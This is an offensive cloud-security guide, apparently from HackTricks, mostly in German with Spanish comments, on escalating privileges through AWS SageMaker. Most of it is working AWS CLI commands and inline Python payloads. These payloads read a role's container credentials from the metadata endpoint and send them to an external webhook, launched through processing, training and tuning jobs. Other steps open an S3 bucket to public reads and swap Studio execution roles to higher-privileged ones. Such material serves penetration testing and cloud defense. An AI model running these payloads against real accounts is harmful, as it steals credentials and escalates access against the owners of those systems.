# AWS - Sagemaker Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## AWS - Sagemaker Privesc

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

Beginne mit dem Erstellen einer Notebook-Instance und hänge die IAM Role an, um Zugriff zu erhalten:
```bash
aws sagemaker create-notebook-instance --notebook-instance-name example \
--instance-type ml.t2.medium \
--role-arn arn:aws:iam::<account-id>:role/service-role/<role-name>
```
Die Antwort sollte ein Feld `NotebookInstanceArn` enthalten, das die ARN der neu erstellten Notebook-Instanz enthält. Anschließend können wir die API `create-presigned-notebook-instance-url` verwenden, um eine URL zu erzeugen, mit der wir auf die Notebook-Instanz zugreifen können, sobald sie bereit ist:
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
Rufe die URL im Browser auf und klicke oben rechts auf `Open JupyterLab``. Scrolle dann zur Registerkarte “Launcher” und klicke im Abschnitt “Other” auf den Button “Terminal”.

Nun ist es möglich, auf die metadata credentials der IAM Role zuzugreifen.

**Potentielle Auswirkung:** Privesc auf die angegebene sagemaker service role.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

Wenn darauf Jupyter **notebooks bereits laufen** und du sie mit `sagemaker:ListNotebookInstances` auflisten kannst (oder sie auf andere Weise entdeckst), kannst du **eine URL für sie generieren, darauf zugreifen und die credentials stehlen, wie in der vorherigen Technik beschrieben**.
```bash
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name <name>
```
**Potentielle Auswirkungen:** Privesc to the sagemaker service role attached.

### `sagemaker:CreateProcessingJob`, `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen kann dafür sorgen, dass **SageMaker einen processing job ausführt**, dem eine SageMaker-Rolle zugeordnet ist. Indem du einen der AWS Deep Learning Containers wiederverwendest, die bereits Python beinhalten (und den Job in derselben Region wie die URI ausführst), kannst du inline-Code ausführen, ohne eigene Images bauen zu müssen:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-arn-role>
IMAGE=683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3
ENV='{"W":"https://example.com/webhook"}'

aws sagemaker create-processing-job \
--processing-job-name privescjob \
--processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":50}}' \
--app-specification "{\"ImageUri\":\"$IMAGE\",\"ContainerEntrypoint\":[\"python\",\"-c\"],\"ContainerArguments\":[\"import os,urllib.request as u;m=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');m and u.urlopen(os.environ['W'],data=u.urlopen('http://169.254.170.2'+m).read())\"]}" \
--environment "$ENV" \
--role-arn $ROLE_ARN

# Las credenciales llegan al webhook indicado. Asegúrate de que el rol tenga permisos ECR (AmazonEC2ContainerRegistryReadOnly) para descargar la imagen.
```
**Potential Impact:** Privesc auf die angegebene sagemaker Service-Rolle.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen kann einen Training-Job starten, der beliebigen Code mit der angegebenen Rolle ausführt. Mit einem offiziellen SageMaker-Container und indem man den entrypoint mit einem payload inline überschreibt, ist es nicht nötig, eigene Images zu bauen:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-role-to-abuse>
IMAGE=763104351884.dkr.ecr.$REGION.amazonaws.com/pytorch-training:2.1-cpu-py310
ENV='{"W":"https://example.com/webhook"}'
OUTPUT_S3=s3://<existing-bucket>/training-output/
# El rol debe poder leer imágenes de ECR (p.e. AmazonEC2ContainerRegistryReadOnly) y escribir en OUTPUT_S3.

aws sagemaker create-training-job \
--training-job-name privesc-train \
--role-arn $ROLE_ARN \
--algorithm-specification "{\"TrainingImage\":\"$IMAGE\",\"TrainingInputMode\":\"File\",\"ContainerEntrypoint\":[\"python\",\"-c\"],\"ContainerArguments\":[\"import os,urllib.request as u;m=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');m and u.urlopen(os.environ['W'],data=u.urlopen('http://169.254.170.2'+m).read())\"]}" \
--output-data-config "{\"S3OutputPath\":\"$OUTPUT_S3\"}" \
--resource-config '{"InstanceCount":1,"InstanceType":"ml.m5.large","VolumeSizeInGB":50}' \
--stopping-condition '{"MaxRuntimeInSeconds":600}' \
--environment "$ENV"

# El payload se ejecuta en cuanto el job pasa a InProgress y exfiltra las credenciales del rol.
```
**Mögliche Auswirkung:** Privesc auf die angegebene SageMaker-Service-Rolle.

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen kann einen HyperParameter Tuning Job starten, der vom Angreifer kontrollierten Code unter der bereitgestellten Rolle ausführt. Script mode erfordert das Hosten des Payloads in S3, aber alle Schritte können über die CLI automatisiert werden:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-role-to-abuse>
BUCKET=sm-hpo-privesc-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION

# Allow public reads so any SageMaker role can pull the code
aws s3api put-public-access-block \
--bucket $BUCKET \
--public-access-block-configuration '{
"BlockPublicAcls": false,
"IgnorePublicAcls": false,
"BlockPublicPolicy": false,
"RestrictPublicBuckets": false
}'

aws s3api put-bucket-policy --bucket $BUCKET --policy "{
\"Version\": \"2012-10-17\",
\"Statement\": [
{
\"Effect\": \"Allow\",
\"Principal\": \"*\",
\"Action\": \"s3:GetObject\",
\"Resource\": \"arn:aws:s3:::$BUCKET/*\"
}
]
}"

cat <<'EOF' > /tmp/train.py
import os, time, urllib.request

def main():
meta = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
if not meta:
return
creds = urllib.request.urlopen(f"http://169.254.170.2{meta}").read()
req = urllib.request.Request(
"https://example.com/webhook",
data=creds,
headers={"Content-Type": "application/json"}
)
urllib.request.urlopen(req)
print("train:loss=0")
time.sleep(300)

if __name__ == "__main__":
main()
EOF

cd /tmp
tar -czf code.tar.gz train.py
aws s3 cp code.tar.gz s3://$BUCKET/code/train-code.tar.gz --region $REGION --acl public-read

echo "dummy" > /tmp/input.txt
aws s3 cp /tmp/input.txt s3://$BUCKET/input/dummy.txt --region $REGION --acl public-read

IMAGE=763104351884.dkr.ecr.$REGION.amazonaws.com/pytorch-training:2.1-cpu-py310
CODE_S3=s3://$BUCKET/code/train-code.tar.gz
TRAIN_INPUT_S3=s3://$BUCKET/input
OUTPUT_S3=s3://$BUCKET/output
# El rol necesita permisos ECR y escritura en el bucket.

cat > /tmp/hpo-definition.json <<EOF
{
"AlgorithmSpecification": {
"TrainingImage": "$IMAGE",
"TrainingInputMode": "File",
"MetricDefinitions": [{"Name": "train:loss", "Regex": "train:loss=([0-9.]+)"}]
},
"StaticHyperParameters": {
"sagemaker_program": "train.py",
"sagemaker_submit_directory": "$CODE_S3"
},
"RoleArn": "$ROLE_ARN",
"InputDataConfig": [
{
"ChannelName": "training",
"DataSource": {
"S3DataSource": {
"S3DataType": "S3Prefix",
"S3Uri": "$TRAIN_INPUT_S3",
"S3DataDistributionType": "FullyReplicated"
}
}
}
],
"OutputDataConfig": {
"S3OutputPath": "$OUTPUT_S3"
},
"ResourceConfig": {
"InstanceType": "ml.m5.large",
"InstanceCount": 1,
"VolumeSizeInGB": 50
},
"StoppingCondition": {
"MaxRuntimeInSeconds": 600
}
}
EOF

aws sagemaker create-hyper-parameter-tuning-job \
--hyper-parameter-tuning-job-name privesc-hpo \
--hyper-parameter-tuning-job-config '{"Strategy":"Random","ResourceLimits":{"MaxNumberOfTrainingJobs":1,"MaxParallelTrainingJobs":1},"HyperParameterTuningJobObjective":{"Type":"Maximize","MetricName":"train:loss"}}' \
--training-job-definition file:///tmp/hpo-definition.json
```
Jedes vom Prozess gestartete Training druckt die Metrik aus und exfiltriert die Anmeldeinformationen der angegebenen Rolle.

### `sagemaker:UpdateUserProfile`/`UpdateSpace`/`UpdateDomain` Studio role swap (kein `iam:PassRole`)

Priorität von ExecutionRole:

- `UserProfile` überschreibt jeden Wert. Wenn ein Profil `ExecutionRole` definiert, verwendet Studio immer diese Rolle.
- `Space` gilt nur, wenn das Profil keine eigene Rolle hat; ansonsten hat die Profilrolle Vorrang.
- `Domain DefaultUserSettings` fungiert als letzter Ausweg, wenn weder Profil noch Space eine Rolle definieren.

Mit Berechtigungen zum Aktualisieren eines SageMaker Studio User Profile (oder Space/Domain) kann ein Angreifer die `ExecutionRole` auf jede IAM-Rolle setzen, die der SageMaker-Service-Principal übernehmen kann. Im Gegensatz zu job-creation APIs benötigen die Studio-Profil-Update-APIs kein `iam:PassRole`. Neue Studio-Apps, die für dieses Profil gestartet werden, laufen mit der ausgetauschten Rolle und ermöglichen interaktive erhöhte Berechtigungen über Jupyter-Terminals oder Jobs, die aus Studio gestartet werden.

Schritte:
```bash
# 1) List Studio user profiles and pick a target
aws sagemaker list-user-profiles --domain-id-equals <DOMAIN_ID>

# Choose a more-privileged role that already trusts sagemaker.amazonaws.com
ROLE_ARN=arn:aws:iam::<ACCOUNT_ID>:role/<HighPrivSageMakerExecutionRole>

# 2) Update the Studio profile to use the new role (no iam:PassRole)
aws sagemaker update-user-profile \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--user-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-user-profile \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query 'UserSettings.ExecutionRole' --output text

# 3) If the tenant uses Studio Spaces, swap the ExecutionRole at the space level
aws sagemaker update-space \
--domain-id <DOMAIN_ID> \
--space-name <SPACE> \
--space-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-space \
--domain-id <DOMAIN_ID> \
--space-name <SPACE> \
--query 'SpaceSettings.ExecutionRole' --output text

# 4) Optionally, change the domain default so every profile inherits the new role
aws sagemaker update-domain \
--domain-id <DOMAIN_ID> \
--default-user-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-domain \
--domain-id <DOMAIN_ID> \
--query 'DefaultUserSettings.ExecutionRole' --output text

# 5) Launch a JupyterServer app (or generate a presigned URL) so new sessions assume the swapped role
aws sagemaker create-app \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--app-type JupyterServer \
--app-name js-atk

# Optional: create a presigned Studio URL and, inside a Jupyter terminal, run:
#    aws sts get-caller-identity  # should reflect the new ExecutionRole
aws sagemaker create-presigned-domain-url \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query AuthorizedUrl --output text
```
**Mögliche Auswirkungen**: Privilege escalation auf die Berechtigungen der angegebenen SageMaker execution role für interaktive Studio-Sitzungen.


## Referenzen

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)


{{#include ../../../../banners/hacktricks-training.md}}
